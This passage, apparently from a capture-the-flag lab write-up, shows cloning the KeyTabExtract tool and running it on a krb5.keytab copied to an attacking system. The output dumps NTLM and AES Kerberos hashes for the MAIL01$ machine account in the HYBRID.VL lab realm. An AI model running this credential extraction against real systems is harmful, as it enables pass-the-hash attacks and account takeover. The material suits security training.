
```bash
git clone https://github.com/sosdave/KeyTabExtract.git
```

Copy `krb5.keytab` to attacking system, and execute script:

```bash
./keytabextract.py ../krb5.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : HYBRID.VL
	SERVICE PRINCIPAL : MAIL01$/
	NTLM HASH : 0f916c5246fdbc7ba95dcef4126d57bd
	AES-256 HASH : eac6b4f4639b96af4f6fc2368570cde71e9841f2b3e3402350d3b6272e436d6e
	AES-128 HASH : 3a732454c95bcef529167b6bea476458
```
